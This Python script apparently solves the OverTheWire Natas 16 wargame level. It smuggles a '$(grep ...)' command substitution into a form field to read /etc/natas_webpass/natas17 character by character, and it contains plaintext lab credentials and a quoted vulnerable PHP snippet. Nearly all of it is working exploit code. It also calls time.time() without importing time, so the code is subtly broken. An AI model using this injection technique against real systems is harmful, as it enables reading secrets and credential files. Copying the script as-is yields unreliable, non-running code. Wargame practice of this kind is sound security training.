#!/usr/bin/python3
# Time: 2019/04/22 5:30 PM
# about:  Blind Grep
# 注意: 查询语句中间的标点, 尤其是空格


import re

import requests
import base64
import urllib
import codecs

from string import ascii_letters, digits
# print(ascii_letters+digits)

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()
characters = ascii_letters + digits


# seen_password = list()
seen_password = list('8Ps3H0GWbn5rd9S')

while len(seen_password) < 32:
    for ch in characters:
        print("".join(seen_password) + ch)

        start_time = time.time()
        # resp = s.post(url, auth=(username, password), data={"needle": "anythings$(grep ^" + "".join(seen_password) + ch + "  /etc/natas_webpass/natas17)"})
        resp = s.post(url, auth=(username, password), data={"needle": "anythings$(grep  ^" + "".join(seen_password) + ch + " /etc/natas_webpass/natas17)"})
        # print(resp.text)

        m = re.findall('<pre>\n(.*)\n</pre>', resp.text)
        # print(m)
        if not m:
            # print(ch, "this is not the one ")
            print("this is one ", ch)
            seen_password.append(ch)
            break

## 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

"""
if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}

"""